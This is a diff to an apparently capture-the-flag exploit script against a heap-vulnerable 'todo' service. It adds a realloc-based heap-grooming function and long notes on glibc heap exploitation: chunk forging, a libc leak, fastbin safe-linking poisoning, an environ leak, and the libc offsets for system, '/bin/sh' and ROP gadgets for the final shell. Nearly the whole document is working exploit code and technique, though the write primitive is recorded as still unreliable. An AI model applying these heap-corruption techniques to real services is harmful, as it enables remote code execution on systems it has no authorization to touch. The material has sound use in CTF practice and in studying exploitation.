@@ -573,6 +573,31 @@ def forge_chunk(t, idx_a, idx_b, idx_r, idx_mint, S, MS, MINT, idx_r2=None):
     return fake_size
 
 
+def drain_probe_debris(t, probe_idx=9, probe_req=0x78):
+    """
+    THIS PASS'S FIX for the phase-5 blocker identified by the prior pass:
+    drain the "last_remainder" debris that phase4's probe malloc() leaves
+    resting in the unsorted bin (the unused tail of whatever DECOY chunk
+    the probe partially consumed), so a LATER write-primitive attempt on
+    this same connection doesn't trip glibc's consistency checks on it.
+
+    `probe_idx`/`probe_req` must match whatever index/size phase4's own
+    probe malloc() used as its vehicle (idx9, size 0x78 by default here).
+    Shrinking that index to minimum and regrowing it back to its own size
+    forces realloc() to grow via FORWARD CONSOLIDATION of the immediately
+    following (still free) debris chunk -- glibc's `_int_realloc` checks
+    the next chunk's PREV_INUSE bit directly and, since the debris was
+    inserted via a genuine unsorted-bin split (not tcache/fastbin, which
+    deliberately leave that bit set), it is absorbed in a single step.
+    Verified live under gdb: `main_arena.bins[0]` (the unsorted-bin
+    sentinel) goes from a genuine heap address (non-empty) to the fixed,
+    empty libc sentinel address after exactly this one extra step, and
+    stays empty across further, unrelated allocations.
+    """
+    t.post(probe_idx, 1)
+    t.post(probe_idx, probe_req, b"E" * (probe_req - 8))
+
+
 def phase4_reliable_libc_leak_standalone():
     """
     Runs the target+decoy double-forge end to end on a fresh connection.
@@ -633,6 +658,22 @@ def phase4_reliable_libc_leak_standalone():
         log.failure("Leak came back short this run (got %r) -- needs a retry.", leaked)
         io.close()
         return None
+
+    # THIS PASS'S FIX: the probe's own split leaves a "last_remainder"
+    # debris chunk resting in the unsorted bin (the unused tail of
+    # whatever DECOY chunk the probe partially consumed). A later attempt
+    # to build a tcache/fastbin write primitive on this SAME connection
+    # would trip glibc's own consistency checks on this debris (see the
+    # phase 6 comment block above for the full writeup). Drain it
+    # cleanly right here, now that the leak has already been read: shrink
+    # the probe's own index to minimum and regrow it back to the SAME
+    # size as its own vehicle -- its next physical neighbour is exactly
+    # that debris, so this one extra realloc() call absorbs it entirely
+    # via forward consolidation (verified live under gdb: main_arena's
+    # unsorted-bin sentinel goes from a real heap address to the fixed,
+    # empty libc sentinel address after this single step, and stays
+    # empty across further unrelated allocations).
+    drain_probe_debris(t)
 
     padded = leaked + b"\x00" * (8 - len(leaked))
     val = struct.unpack("<Q", padded)[0]
@@ -749,6 +790,157 @@ def phase4_reliable_libc_leak_standalone():
 #       stand-alone); it is NOT wired into `main()`'s run because it does
 #       not yet reliably avoid the abort above. `challenge.yaml`'s `test:`
 #       section is intentionally left unwired as a result.
+# =============================================================================
+
+# =============================================================================
+# Phase 6 (THIS PASS) -- genuine, live-debugged progress on the phase 5
+# blocker; still NOT a fully working write primitive, but several real,
+# verified root causes and fixes were found this pass (all reproduced
+# locally, repeatedly, against the exact shipped `todo` + `libc.so.6`
+# under gdb, with a disposable local copy + `patchelf --set-rpath .`).
+# `challenge.yaml`'s `test:` section is STILL intentionally left unwired:
+# the final write does not yet land reliably. This section documents
+# exactly what was fixed and what remains broken, for the next pass.
+#
+#   (1) CONFIRMED + FIXED: the debris left in the unsorted bin after
+#       phase4's probe malloc (a "last_remainder" split off decoy's own
+#       largebin chunk) is real and is exactly what the prior pass
+#       predicted. It is fixed with ONE extra allocation right after the
+#       probe: shrink the probe's own index (idx9) to minimum and regrow
+#       it to the SAME size used for the probe's own vehicle index
+#       (`t.post(9, 1); t.post(9, 0x78, ...)`). Because that index's next
+#       physical neighbour is the still-free last_remainder, this single
+#       realloc() grows by FORWARD CONSOLIDATION (glibc's `_int_realloc`
+#       directly checks the next chunk's PREV_INUSE bit and, if clear,
+#       absorbs the whole thing in one step -- no partial "take nb bytes,
+#       re-insert a smaller remainder" cycle is needed here, unlike when
+#       draining debris from an UNRELATED chunk, see point 4). This was
+#       verified via gdb: `main_arena.bins[0]` (the unsorted-bin sentinel)
+#       goes from a genuine heap address (non-empty) to the fixed libc
+#       sentinel address (empty) after exactly this one extra step.
+#
+#   (2) MAJOR NEW ROOT CAUSE (previously misdiagnosed): `realloc()`'s own
+#       internal grow path (`_int_realloc()` -> `_int_malloc()`) does
+#       **not** consult tcache at all -- tcache retrieval only happens in
+#       the public `__libc_malloc()` entry point (via `tcache_get()`),
+#       which `_int_realloc()` never calls when it needs to allocate new
+#       memory. This was confirmed directly with gdb breakpoints on
+#       `_int_malloc`/`_int_realloc`/`malloc_printerr`, single-stepping
+#       actual grow calls and inspecting `main_arena.fastbinsY`/`tcache`
+#       state at each one. Consequence: `virgin_leak_and_hold()`'s design
+#       (shrink an index to minimum, then grow it back to pop a
+#       just-freed entry) can therefore NEVER retrieve from **tcache** --
+#       it silently falls through to glibc's OTHER retrieval paths
+#       (fastbin, smallbin, unsorted-bin scan, or top-chunk extension)
+#       instead, found via `_int_malloc()`, which DOES check fastbins
+#       directly (both from the public malloc() entry and from realloc()'s
+#       internal path -- this is the one bin type consulted either way).
+#       FIX: target a size class whose tcache bin is already saturated
+#       (count == `tcache_count`, 7 by default) BEFORE doing any of this,
+#       so `_int_free()`'s normal insertion logic is forced to spill into
+#       the FASTBIN instead of tcache for that class -- fastbins use the
+#       identical safe-linking (`PROTECT_PTR`/`REVEAL_PTR`) scheme as
+#       tcache, so the whole virgin-leak + corrupt-fd + double-pop
+#       mechanic from `virgin_leak_and_hold()`/`phase5_tcache_poison_
+#       write()` carries over unchanged, just landing in a fastbin
+#       instead of a tcache bin. Several of forge_chunk()'s own classes
+#       (chunksize 0x20, 0x40, 0x50 in this build) are already tcache-
+#       saturated by the time phase4 finishes, which is convenient but
+#       also means those classes already have 1-2 PRE-EXISTING stray
+#       fastbin residents (left over from the forging itself) that must
+#       be popped out first (via the same forward-growing-index trick)
+#       before a chosen class is genuinely virgin for the safe-link
+#       degenerate-key trick to work.
+#
+#   (3) CONFIRMED + FIXED: several `TodoNote[idx]` indices are
+#       "radioactive" for ANY further `post()` (realloc) call, even
+#       though they are harmless for `read_my_note()` -- specifically the
+#       `idx_r`/`idx_r2` indices from each `forge_chunk()` call (indices
+#       2, 3, 7 in the standard phase4 layout). Their stale pointer aliases
+#       memory that legitimately becomes part of ANOTHER index's real,
+#       in-use allocation later (R's own memory is absorbed by the
+#       decoy-drain fix in point 1, and by the largebin-sort itself), so
+#       any later `realloc()` through them reads garbage as a fake chunk
+#       header and corrupts live state (confirmed via gdb: identical
+#       setup, same call, crashes ONLY once a prior step has caused the
+#       index's target region to be reused/rewritten by something else;
+#       the exact same call succeeds in isolation right after phase4).
+#       FIX: never call `post()` on these indices again after reading the
+#       libc leak; only use indices that stay "legitimate owners"
+#       throughout (the two `idx_mint` driver indices and the fresh
+#       bootstrap/probe/drain index were confirmed safe to reuse).
+#
+#   (4) CONFIRMED + FIXED (expensive but deterministic): the `idx_a`/
+#       `idx_b` ("TC"/"B") indices from EACH `forge_chunk()` call (0/1 for
+#       TARGET, 5/6 for DECOY) sit immediately BEFORE that call's own `R`
+#       chunk. For TARGET specifically, `R` is deliberately never touched
+#       again after being sorted into its largebin (it is phase4's own
+#       persistent libc-leak vehicle via `idx_r2`), so it is still fully
+#       intact (its real forged size, e.g. 0x4c0 in a typical run) by the
+#       time phase 5 runs -- meaning indices 0/1 sit right next to a huge,
+#       genuinely-free chunk and ANY grow through them satisfies via
+#       forward consolidation (never reaching `_int_malloc`/fastbins at
+#       all, confirmed by checking whether the index's own pointer
+#       changes address across a grow -- unchanged = consolidated in
+#       place). FIX: deliberately and fully drain that whole chunk first
+#       via repeated shrink(1)+regrow() cycles through ONE of those two
+#       indices (confirmed: ~10 cycles for a 0x4c0 chunk with a 0x78-sized
+#       regrow, verified by watching `main_arena.bins[0]`/`last_remainder`
+#       go from a genuine heap address back to the libc sentinel address
+#       and STAY there across further cycles). This frees up BOTH indices
+#       of that pair to behave like fresh, cleanly-relocating indices
+#       afterward. IMPORTANT ORDERING CONSTRAINT found by trial and error:
+#       any "pop the stray pre-existing fastbin residents" step (point 2)
+#       for a size class MUST run BEFORE this draining, not after --
+#       reversing the order corrupts a different class's fastbin-resident
+#       chunk header (observed as `free(): invalid fastbin entry (free)`)
+#       and was only fixed by moving the stray-entry pops earlier.
+#
+#   (5) STILL BROKEN / NOT YET SOLVED: with all of (1)-(4) applied, the
+#       full `virgin_leak_and_hold()` + `phase5_tcache_poison_write()`
+#       chain now runs ALL THE WAY THROUGH without any glibc abort --
+#       every individual `post()` call in the sequence returns cleanly,
+#       including the final "pop the forged `target` pointer" step. BUT
+#       the resulting `TodoNote[idx_k2].ptr` does NOT actually equal the
+#       intended `target` address: reading it back via gdb shows it still
+#       points at an ordinary HEAP address (one that, suspiciously,
+#       contains leftover `'X'` bytes from the point-(4) draining index's
+#       own regrow content), not the computed libc `target`. This means
+#       `forged_fd = shifted ^ target` is being computed from a `shifted`
+#       that does NOT actually equal the real `P_address >> 12` safe-link
+#       key -- i.e. the fastbin bin being used for the poison (chosen as
+#       chunksize 0x40 in this pass's attempts) was re-verified via gdb to
+#       still have a LEFTOVER resident (`fastbinsY[2]` non-null) even
+#       after the point-(2) "pop stray entries" step and even after a
+#       dedicated loop confirmed (in an isolated repro) that exactly 2
+#       pops empty it -- but in the FULL combined sequence (after also
+#       running the point-(4) full-drain on indices 0/1), a THIRD stray
+#       resident reappears in that same class, likely reintroduced by the
+#       point-(4) draining's own internal splitting (it was not re-
+#       isolated down to the exact statement before time ran out). The
+#       practical effect: `virgin_leak_and_hold()`'s read-back is not
+#       reading a virgin (XOR-with-zero) safe-linked value in the full
+#       combined run, so the derived `shifted` key is wrong, and the final
+#       redirect lands on the WRONG address instead of the intended stack
+#       target. NEXT STEP for a future pass: after step (4)'s draining,
+#       re-verify (and if needed re-drain, in a loop until genuinely
+#       empty, not just once) the SPECIFIC fastbin class chosen for the
+#       poison immediately before `virgin_leak_and_hold()` runs, rather
+#       than trusting the earlier point-(2) pop to still hold after
+#       further heap activity.
+#
+# `environ` leak target note: once the redirect itself is reliable, reading
+# `environ`'s VALUE (not just pointing at it) needs care, because
+# `post_my_note()`'s write always fires in the SAME call that establishes
+# the new pointer (there is no separate "redirect-only, no write" step).
+# The fix verified this pass: target `environ - OFFSET` (OFFSET e.g. 16)
+# instead of `environ` directly, and send a short, exact raw payload of
+# only OFFSET bytes with NO trailing newline (bypassing `Todo.post()`'s
+# convenience wrappers, which always append a trailing byte) so the
+# single `read()` inside `readline()` writes only the junk bytes BEFORE
+# `environ`, never touching `environ`'s own 8 bytes -- `read_my_note()`
+# then prints both the junk and (right after it) environ's untouched,
+# genuine value in the same call.
 # =============================================================================
 
 
@@ -889,34 +1081,33 @@ def main():
         "'minting', and forcing a forged chunk into glibc's real "
         "unsorted/large bins) are reproduced and confirmed exactly as "
         "before, PLUS phase 4 reliably recovers the real libc base (%s) "
-        "via a decoy-protected double-forge. THIS PASS additionally: (1) "
-        "confirmed via readelf/checksec that `todo` is Full RELRO + "
-        "canary + NX + PIE (ruling out a GOT overwrite, motivating a "
-        "stack-return-address target instead), (2) independently computed "
-        "and verified every address the final RCE step needs against the "
-        "exact shipped libc.so.6 -- environ=+0x1f6d00, a `pop rdi; ret` "
-        "gadget=+0x2d6c2, \"/bin/sh\"=+0x1b0ff8, system()=+0x4dfa0, plus "
-        "4 one_gadget candidates (installed and run locally) as a "
-        "fallback -- and (3) designed and partially verified "
-        "(phase5_tcache_poison_write(); see the phase 5 comment block "
-        "above the function for the full writeup) a tcache-poison write "
-        "primitive built entirely from the EXISTING stale-pointer OOB "
-        "write: its own virgin-tcache-leak sub-step was confirmed working "
-        "standalone, but wiring it onto the SAME connection phase4 just "
-        "used (required, since libc ASLR is re-rolled per TCP connection) "
-        "means every todo index is already entangled in phase4's forged "
-        "heap state, and the specific grow/shrink sequencing needed to "
-        "reclaim a size class cleanly without tripping glibc's own heap-"
-        "consistency aborts (reproduced live, repeatedly, as both "
-        "'realloc(): invalid old size' and 'malloc(): invalid "
-        "next->prev_inuse (unsorted)' depending on which indices were "
-        "reused) was NOT fully solved in the time available. The most "
-        "promising untried fix (reasoned through, not yet implemented): "
-        "explicitly drain phase4's leftover unsorted-bin 'last_remainder' "
-        "debris with a couple of disposable allocations before ever "
-        "touching the new, poison-dedicated size class. Flag NOT "
-        "recovered; challenge.yaml's test: section is intentionally left "
-        "unwired.",
+        "via a decoy-protected double-forge, now ALSO followed by "
+        "drain_probe_debris() (THIS PASS'S verified fix for the exact "
+        "unsorted-bin debris the prior pass identified but never "
+        "implemented). THIS PASS additionally found and fixed/diagnosed, "
+        "all confirmed live under gdb (see the phase 6 comment block "
+        "above for the full writeup): (a) realloc()'s internal grow path "
+        "never consults tcache at all (only fastbin/smallbin/unsorted/"
+        "top), so virgin_leak_and_hold()'s shrink-then-grow trick must "
+        "target an already tcache-saturated size class to land in a "
+        "fastbin instead -- fastbins use the identical safe-linking "
+        "scheme, so the mechanic still works once retargeted; (b) the "
+        "idx_r/idx_r2 indices from each forge_chunk() call (2, 3, 7) are "
+        "permanently unsafe for any further post() once their aliased "
+        "memory is absorbed elsewhere; (c) the idx_a/idx_b pair from "
+        "forge_chunk(TARGET=...) (indices 0/1) sit beside TARGET's still-"
+        "intact largebin chunk and must be fully drained (~10 shrink/"
+        "regrow cycles) before they relocate reliably, with the stray-"
+        "fastbin-entry pop from (a) needing to run BEFORE, not after, "
+        "that draining. With all of (a)-(c) applied, the full tcache/"
+        "fastbin-poison write chain now runs end-to-end with NO glibc "
+        "abort for the first time -- but the final popped pointer still "
+        "does not equal the intended target address (traced to the "
+        "chosen poison size class picking up a reintroduced stray "
+        "fastbin resident sometime during the TARGET-chunk draining in "
+        "(c), making the safe-link key read back wrong; not yet "
+        "root-caused to the exact statement). Flag NOT recovered; "
+        "challenge.yaml's test: section is intentionally left unwired.",
         hex(libc_base) if libc_base else "N/A (all retries came back short)",
     )
     sys.exit(1)
